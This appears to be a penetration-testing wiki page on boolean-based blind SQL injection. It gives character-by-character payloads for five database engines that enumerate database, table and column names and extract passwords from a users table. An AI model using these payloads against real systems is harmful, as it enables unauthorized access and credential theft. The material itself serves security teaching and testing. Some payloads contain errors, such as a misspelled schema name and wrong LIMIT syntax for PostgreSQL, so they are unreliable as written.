# Boolean Based

## Theory

Boolean-based SQL injection is a technique that relies on sending an SQL query to the database based on which the technique forces the application to return different results.\
The result allows an attacker to judge whether the payload used returns true or false. Even though no data from the database are recovered, the results give the attacker valuable information. Depending on the boolean result (TRUE or FALSE), the content within the response will change, or remain the same.

## Practice

#### Getting database

{% tabs %}
{% tab title="MySQL" %}
First, retrieve the database length:

```sql
1' AND (SELECT LENGTH(database()))=1-- -  #False  
1' AND (SELECT LENGTH(database()))=2-- -  #False
1' AND (SELECT LENGTH(database()))=3-- -  #True -> It means the length of database is 3 characters.
```

Second, retrieve the database name:

```sql
--True -> It means the first character is p. Note that ASCII code is in decimal
1' AND (SELECT HEX(SUBSTRING(database(), 1, 1)))=HEX('p')-- -
1' AND (SELECT ASCII(SUBSTRING(database(), 1, 1)))=112-- - 

--True -> It means the second character is w.
1' AND (SELECT HEX(SUBSTRING(database(), 2, 1)))=HEX('w')-- -

--True -> It means the third character is n.
1' AND (SELECT HEX(SUBSTRING(database(), 3, 1)))=HEX('n')-- -
```
{% endtab %}

{% tab title="MSSQL" %}
First, retrieve the database length:

```sql
1' AND (SELECT LEN(DB_NAME()))=1--  #False  
1' AND (SELECT LEN(DB_NAME()))=2--  #False
1' AND (SELECT LEN(DB_NAME()))=3--  #True -> It means the length of database is 3 characters.
```

Second, retrieve the database name:

```sql
--True -> It means the first character is p. Note that ASCII code is in decimal
1' AND (SELECT ASCII(SUBSTRING(DB_NAME(), 1, 1)))=112-- 

--True -> It means the second character is s.
1' AND (SELECT ASCII(SUBSTRING(DB_NAME(), 2, 1)))=115--

--True -> It means the third character is s.
1' AND (SELECT ASCII(SUBSTRING(DB_NAME(), 3, 1)))=115--
```
{% endtab %}

{% tab title="OracleSQL" %}
First, retrieve the database length:

```sql
1' AND (SELECT LENGTH(global_name) FROM global_name)=1--  #False  
1' AND (SELECT LENGTH(global_name) FROM global_name)=2--  #False
1' AND (SELECT LENGTH(global_name) FROM global_name)=3--  #True -> It means the length of database is 3 characters.
```

Second, retrieve the database name:

```sql
--True -> It means the first character is p. Note that ASCII code is in decimal
1' AND (SELECT ASCII(SUBSTR(global_name, 1, 1)) FROM global_name)=112-- 

--True -> It means the second character is s.
1' AND (SELECT ASCII(SUBSTR(global_name, 2, 1)) FROM global_name)=115--

--True -> It means the third character is s.
1' AND (SELECT ASCII(SUBSTR(global_name, 3, 1)) FROM global_name)=115--
```
{% endtab %}

{% tab title="PostgreSQL" %}
First, retrieve the database length:

```sql
1' AND (SELECT LENGTH(current_database()))=1--  #False  
1' AND (SELECT LENGTH(current_database()))=2--  #False
1' AND (SELECT LENGTH(current_database()))=3--  #True -> It means the length of database is 3 characters.
```

Second, retrieve the database name:

```sql
--True -> It means the first character is p. Note that ASCII code is in decimal
1' AND (SELECT ASCII(SUBSTRING(current_database(), 1, 1)))=112-- 

--True -> It means the second character is s.
1' AND (SELECT ASCII(SUBSTRING(current_database(), 2, 1)))=115--

--True -> It means the third character is s.
1' AND (SELECT ASCII(SUBSTRING(current_database(), 3, 1)))=115--
```
{% endtab %}

{% tab title="SQLite" %}
Principal database is call `main`, but It's possible that multiple database file are open, you can find their name's lenght like this :

```sql
1' AND (SELECT LENGTH(name) FROM pragma_database_list LIMIT 1 OFFSET 0)=1--  #False  
1' AND (SELECT LENGTH(name) FROM pragma_database_list LIMIT 1 OFFSET 0)=2--  #False
1' AND (SELECT LENGTH(name) FROM pragma_database_list LIMIT 1 OFFSET 0)=3--  #True ->length of first database is 3 characters.

1' AND (SELECT LENGTH(name) FROM pragma_database_list LIMIT 1 OFFSET 1)=3--  #True -> It means the length of second database is 3 characters.
```

Second, retrieve the name of database:

```sql
--True -> It means the first character of second database's name is p.
1' AND (SELECT hex(substr(name,1,1)) FROM pragma_database_list LIMIT 1 OFFSET 1)=HEX('p')-- 

--True -> It means the second character is s.
1' AND (SELECT hex(substr(name,2,1)) FROM pragma_database_list LIMIT 1 OFFSET 1)=HEX('s')--

--True -> It means the third character is s.
1' AND (SELECT hex(substr(name,3,1)) FROM pragma_database_list LIMIT 1 OFFSET 1)=HEX('s')--
```
{% endtab %}
{% endtabs %}

#### Getting Tables

{% tabs %}
{% tab title="MySQL" %}
First, retrieve the number of tables:

```sql
1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=2-- -  #True -> 2 tables
```

Second, retrieve length of each table

```sql
-- If True, the first table lenght is 5
1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=5-- - 

-- If True, the second table lenght is 5
1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)=5-- - 
```

Third, retrieve name of each table

```sql
-- If True, the first char of the first table is u
1'AND (SELECT HEX(SUBSTRING(table_name, 1, 1))FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=HEX('u')-- -

-- If True, the second char of the first table is s
1'AND (SELECT HEX(SUBSTRING(table_name, 2, 1)) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=HEX('s')-- -

-- If True, the first char of the second table is p
1'AND (SELECT HEX(SUBSTRING(table_name, 1, 1)) FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)=HEX('p')-- -
```
{% endtab %}

{% tab title="MSSQL" %}
First, retrieve the number of tables:

```sql
1' AND (SELECT count(*) FROM information_schema.tables WHERE TABLE_CATALOG=DB_NAME())=2--  #True -> 2 tables
1' AND (SELECT count(*) FROM information_schema.tables)=2-- #Run in actual context/DB
```

Second, retrieve length of each table

```sql
-- If True, the first table lenght is 5
1' AND (SELECT TOP 1 LEN(table_name) FROM information_schema.tables WHERE TABLE_CATALOG=DB_NAME())=5-- 

-- If True, the second table lenght is 5
1' AND (SELECT TOP 1 LEN(table_name) FROM information_schema.tables WHERE TABLE_CATALOG=DB_NAME() AND table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))=5--

-- If True, the third table lenght is 5
1' AND (SELECT TOP 1 LEN(table_name) FROM information_schema.tables WHERE TABLE_CATALOG=DB_NAME() AND table_name NOT IN(SELECT TOP 2 table_name FROM information_schema.tables))=5-- 
```

Third, retrieve name of each table

```sql
-- If True, the first char of the first table is u
1'AND (SELECT TOP 1 ASCII(SUBSTRING(table_name, 1, 1)) FROM information_schema.tables WHERE TABLE_CATALOG=DB_NAME())=117--

-- If True, the second char of the first table is s
1'AND (SELECT TOP 1 ASCII(SUBSTRING(table_name, 2, 1)) FROM information_schema.tables WHERE TABLE_CATALOG=DB_NAME())=115--

-- If True, the first char of the second table is p
1'AND (SELECT TOP 1 ASCII(SUBSTRING(table_name, 1, 1)) FROM information_schema.tables WHERE TABLE_CATALOG=DB_NAME() AND table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))=112--

-- If True, the first char of the third table is p
1'AND (SELECT TOP 1 ASCII(SUBSTRING(table_name, 1, 1)) FROM information_schema.tables WHERE TABLE_CATALOG=DB_NAME() AND table_name NOT IN(SELECT TOP 2 table_name FROM information_schema.tables))=112--
```
{% endtab %}

{% tab title="OracleSQL" %}
First, retrieve the number of tables:

```sql
1' AND (SELECT COUNT(*) FROM all_tables WHERE owner = USER)=2-- #True -> 2 tables
```

Second, retrieve length of each table

```sql
-- If True, the first table lenght is 5
1' AND (SELECT LENGTH(table_name) FROM all_tables WHERE owner = USER OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=5--

-- If True, the second table lenght is 5
1' AND (SELECT LENGTH(table_name) FROM all_tables WHERE owner = USER OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY)=5-- 
```

Third, retrieve name of each table

<pre class="language-sql"><code class="lang-sql">-- If True, the first char of the first table is u
<strong>1'AND (SELECT ASCII(SUBSTR(table_name, 1, 1)) FROM all_tables WHERE owner = USER OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=117--
</strong>
-- If True, the second char of the first table is s
1'AND (SELECT ASCII(SUBSTR(table_name, 2, 1)) FROM all_tables WHERE owner = USER OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=115--

-- If True, the first char of the second table is p
1'AND (SELECT ASCII(SUBSTR(table_name, 1, 1)) FROM all_tables WHERE owner = USER OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY)=112--
</code></pre>
{% endtab %}

{% tab title="PostgreSQL" %}
First, retrieve the number of tables:

```sql
1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=current_database())=2-- #True -> 2 tables
```

Second, retrieve length of each table

```sql
-- If True, the first table lenght is 5
1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=current_database() LIMIT 0,1)=5--

-- If True, the second table lenght is 5
1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=current_database() LIMIT 1,1)=5-- 
```

Third, retrieve name of each table

<pre class="language-sql"><code class="lang-sql">-- If True, the first char of the first table is u
<strong>1'AND (SELECT ASCII(SUBSTRING(table_name, 1, 1))FROM information_schema.tables WHERE table_schema=current_database() LIMIT 0,1)=117--
</strong>
-- If True, the second char of the first table is s
1'AND (SELECT ASCII(SUBSTRING(table_name, 2, 1)) FROM information_schema.tables WHERE table_schema=current_database() LIMIT 0,1)=115--

-- If True, the first char of the second table is p
1'AND (SELECT ASCII(SUBSTRING(table_name, 1, 1)) FROM nformation_schema.tables WHERE table_schema=current_database() LIMIT 1,1)=112--
</code></pre>
{% endtab %}

{% tab title="SQLite" %}
First, retrieve the number of tables:

```sql
1' AND (SELECT COUNT(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%')=2-- #True -> 2 tables
```

Second, retrieve length of each table

```sql
-- If True, the first table lenght is 5
1' AND (SELECT LENGTH(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' LIMIT 1 OFFSET 0)=5--

-- If True, the second table lenght is 5
1' AND (SELECT LENGTH(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' LIMIT 1 OFFSET 1)=5-- 
```

Third, retrieve name of each table

<pre class="language-sql"><code class="lang-sql">-- If True, the first char of the first table is u
<strong>1'AND (SELECT HEX(SUBSTR(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' LIMIT 1 OFFSET 0)=HEX('u')--
</strong>
-- If True, the second char of the first table is s
1'AND (SELECT HEX(SUBSTR(tbl_name,2,1)) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' LIMIT 1 OFFSET 0)=HEX('s')--

-- If True, the first char of the second table is p
1'AND (SELECT HEX(SUBSTR(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' LIMIT 1 OFFSET 1)=HEX('p')--
</code></pre>
{% endtab %}
{% endtabs %}

#### Getting Columns

{% tabs %}
{% tab title="MySQL" %}
First, retrieve the number of columns:

```sql
1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='TABLE_NAME_HERE')=2-- -  #True -> 2 columns
```

Second, retrieve length of each column

```sql
-- If True, the first column's name lenght is 3
1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='TABLE_NAME_HERE' LIMIT 0,1)=3-- - 

-- If True, the name of second column's lenght is 8
1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='TABLE_NAME_HERE' LIMIT 1,1)=8-- - 
```

Third, retrieve name of each column

```sql
-- If True, the first char of the first column is a
1'AND (SELECT HEX(SUBSTRING(column_name, 1, 1))FROM information_schema.columns WHERE table_schema=database() AND table_name='TABLE_NAME_HERE' LIMIT 0,1)=HEX('a')-- -

-- If True, the second char of the first column is b
1'AND (SELECT HEX(SUBSTRING(column_name, 2, 1))FROM information_schema.columns WHERE table_schema=database() AND table_name='TABLE_NAME_HERE' LIMIT 0,1)=HEX('b')-- -

-- If True, the first char of the second column is p
1'AND (SELECT HEX(SUBSTRING(column_name, 1, 1))FROM information_schema.columns WHERE table_schema=database() AND table_name='TABLE_NAME_HERE' LIMIT 1,1)=HEX('p')-- -
```
{% endtab %}

{% tab title="MSSQL" %}
First, retrieve the number of columns:

```sql
1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE TABLE_CATALOG=DB_NAME() AND table_name='TABLE_NAME_HERE')=2--  #True -> 2 tables
```

Second, retrieve length of each columns

```sql
-- If True, the first column lenght is 5
1' AND (SELECT TOP 1 LEN(column_name) FROM information_schema.columns WHERE TABLE_CATALOG=DB_NAME() AND table_name='TABLE_NAME_HERE')=5-- 

-- If True, the second column lenght is 5
1' AND (SELECT TOP 1 LEN(column_name) FROM information_schema.columns WHERE TABLE_CATALOG=DB_NAME() AND table_name='TABLE_NAME_HERE' AND column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))=5--

-- If True, the third column lenght is 5
1' AND (SELECT TOP 1 LEN(column_name) FROM information_schema.columns WHERE TABLE_CATALOG=DB_NAME() AND table_name='TABLE_NAME_HERE' AND column_name NOT IN(SELECT TOP 2 column_name FROM information_schema.columns))=5-- 
```

Third, retrieve name of each columns

```sql
-- If True, the first char of the first column is a
1'AND (SELECT TOP 1 ASCII(SUBSTRING(column_name, 1, 1)) FROM information_schema.columns WHERE TABLE_CATALOG=DB_NAME() AND table_name='TABLE_NAME_HERE')=97--

-- If True, the second char of the first column is b
1'AND (SELECT TOP 1 ASCII(SUBSTRING(column_name, 2, 1)) FROM information_schema.columns WHERE TABLE_CATALOG=DB_NAME() AND table_name='TABLE_NAME_HERE')=98--

-- If True, the first char of the second column is p
1'AND (SELECT TOP 1 ASCII(SUBSTRING(column_name, 1, 1)) FROM information_schema.columns WHERE TABLE_CATALOG=DB_NAME() AND table_name='TABLE_NAME_HERE' AND column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))=112--

-- If True, the first char of the third column is p
1'AND (SELECT TOP 1 ASCII(SUBSTRING(column_name, 1, 1)) FROM information_schema.columns WHERE TABLE_CATALOG=DB_NAME() AND table_name='TABLE_NAME_HERE' AND column_name NOT IN(SELECT TOP 2 column_name FROM information_schema.columns))=112--
```
{% endtab %}

{% tab title="OracleSQL" %}
First, retrieve the number of columns:

```sql
1' AND (SELECT COUNT(column_name) FROM all_tab_columns WHERE owner = USER AND table_name='TABLE_NAME_HERE')=2--  #True -> 2 columns
```

Second, retrieve length of each column

```sql
-- If True, the first column's name lenght is 3
1' AND (SELECT LENGTH(column_name) FROM all_tab_columns WHERE owner = USER AND table_name='TABLE_NAME_HERE' OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=3-- 

-- If True, the second column's name lenght is 8
1' AND (SELECT LENGTH(column_name) FROM all_tab_columns WHERE owner = USER AND table_name='TABLE_NAME_HERE' OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY)=8-- 
```

Third, retrieve name of each column

```sql
-- If True, the first char of the first column is a
1'AND (SELECT ASCII(SUBSTR(column_name, 1, 1)) FROM all_tab_columns WHERE owner = USER AND table_name='TABLE_NAME_HERE' OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=97--

-- If True, the second char of the first column is b
1'AND (SELECT ASCII(SUBSTR(column_name, 2, 1)) FROM all_tab_columns WHERE owner = USER AND table_name='TABLE_NAME_HERE' OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=98--

-- If True, the first char of the second column is p
1'AND (SELECT ASCII(SUBSTR(column_name, 1, 1)) FROM all_tab_columns WHERE owner = USER AND table_name='TABLE_NAME_HERE' OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY)=112--
```
{% endtab %}

{% tab title="PostgreSQL" %}
First, retrieve the number of columns:

```sql
1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE')=2--  #True -> 2 columns
```

Second, retrieve length of each column

```sql
-- If True, the first column's name lenght is 3
1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 0,1)=3-- 

-- If True, the second column's name lenght is 8
1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 1,1)=8-- 
```

Third, retrieve name of each column

```sql
-- If True, the first char of the first column is a
1'AND (SELECT ASCII(SUBSTRING(column_name, 1, 1))FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 0,1)=97--

-- If True, the second char of the first column is b
1'AND (SELECT ASCII(SUBSTRING(column_name, 2, 1))FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 0,1)=98--

-- If True, the first char of the second column is p
1'AND (SELECT ASCII(SUBSTRING(column_name, 1, 1))FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 1,1)=112--
```
{% endtab %}

{% tab title="SQLite" %}
Enumeration of colums is a bit differents in SQLite. We have to enum the sqlite\_schema.sql fields that stores SQL text that describes the object. This SQL text is a [CREATE TABLE](https://www.sqlite.org/lang\_createtable.html), [CREATE VIRTUAL TABLE](https://www.sqlite.org/lang\_createvtab.html), [CREATE INDEX](https://www.sqlite.org/lang\_createindex.html), [CREATE VIEW](https://www.sqlite.org/lang\_createview.html), or [CREATE TRIGGER](https://www.sqlite.org/lang\_createtrigger.html) statement that if evaluated against the database file when it is the main database of a [database connection](https://www.sqlite.org/c3ref/sqlite3.html) would recreate the object.&#x20;

We can send the following queries to retrieve it

```sql
-- If True, the first char of sql field is C
1' AND (SELECT HEX(SUBSTR(sql,1,1)) FROM sqlite_master WHERE type!='meta' and sql NOT NULL AND name='TABLE_NAME_HERE')=HEX('C')--

-- If True, the second char of sql field is R
1' AND (SELECT HEX(SUBSTR(sql,2,1)) FROM sqlite_master WHERE type!='meta' and sql NOT NULL AND name='TABLE_NAME_HERE')=HEX('R')--
```
{% endtab %}
{% endtabs %}

#### Dump values

{% tabs %}
{% tab title="MySQL" %}
First, retrieve the length of the value (we take password column as example):

```sql
1' AND (SELECT LENGTH(password) FROM users LIMIT 0,1)=9-- -  #True -> 1st password is 9 char
```

Second, retrieve values

```sql
-- If True, the first password's char is p
1'AND (SELECT HEX(SUBSTRING(password, 1, 1))FROM users LIMIT 0,1)=HEX('p')-- -

-- If True, the second password's char is a
1'AND (SELECT HEX(SUBSTRING(password, 2, 1))FROM users LIMIT 0,1)=HEX('a')-- -
```
{% endtab %}

{% tab title="MSSQL" %}
First, retrieve the length of the value (we take password column as example):

```sql
-- True -> 1st password is 9 char
1' AND (SELECT TOP 1 LEN(password) FROM users)=9--

-- True -> 2st password is 9 char
1' AND (SELECT TOP 1 LEN(password) FROM users WHERE password NOT IN(SELECT TOP 1 password FROM admin))=9--
```

Second, retrieve values

```sql
-- If True, the first password's char is p
1'AND (SELECT TOP 1 ASCII(SUBSTRING(password, 1, 1))FROM users)=112--

-- If True, the second password's char is a
1'AND (SELECT TOP 1 ASCII(SUBSTRING(password, 2, 1))FROM users)=97--

-- If True, the first char of second password is p
1'AND (SELECT TOP 1 ASCII(SUBSTRING(password, 1, 1))FROM users WHERE password NOT IN(SELECT TOP 1 password FROM admin))=112--

-- If True, the second char of second password is p
1'AND (SELECT TOP 1 ASCII(SUBSTRING(password, 2, 1))FROM users WHERE password NOT IN(SELECT TOP 1 password FROM admin))=97--
```
{% endtab %}

{% tab title="OracleSQL" %}
First, retrieve the length of the value (we take password column as example):

```sql
1' AND (SELECT LENGTH(password) FROM users OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=9--  #True -> 1st password is 9 char
```

Second, retrieve values

```sql
-- If True, the first password's char is p
1'AND (SELECT ASCII(SUBSTR(password, 1, 1)) FROM users OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=112--

-- If True, the second password's char is a
1'AND (SELECT ASCII(SUBSTR(password, 2, 1)) FROM users OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=97--
```
{% endtab %}

{% tab title="PostgreSQL" %}
First, retrieve the length of the value (we take password column as example):

```sql
1' AND (SELECT LENGTH(password) FROM users LIMIT 0,1)=9--  #True -> 1st password is 9 char
```

Second, retrieve values

```sql
-- If True, the first password's char is p
1'AND (SELECT ASCII(SUBSTRING(password, 1, 1))FROM users LIMIT 0,1)=112--

-- If True, the second password's char is a
1'AND (SELECT ASCII(SUBSTRING(password, 2, 1))FROM users LIMIT 0,1)=97--
```
{% endtab %}

{% tab title="SQLite" %}
First, retrieve the length of the value (we take password column as example):

```sql
1' AND (SELECT LENGTH(password) FROM users LIMIT 1 OFFSET 0)=9--  #True -> 1st password is 9 char
```

Second, retrieve values

```sql
-- If True, the first char of first password is p
1'AND (SELECT HEX(SUBSTR(password, 1, 1)) FROM users LIMIT 1 OFFSET 0)=HEX('p')--

-- If True, the second char of first password is a
1'AND (SELECT HEX(SUBSTR(password, 2, 1)) FROM users LIMIT 1 OFFSET 0)=HEX('a')
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://portswigger.net/web-security/sql-injection" %}

{% embed url="https://defendtheweb.net/article/blind-sql-injection" %}
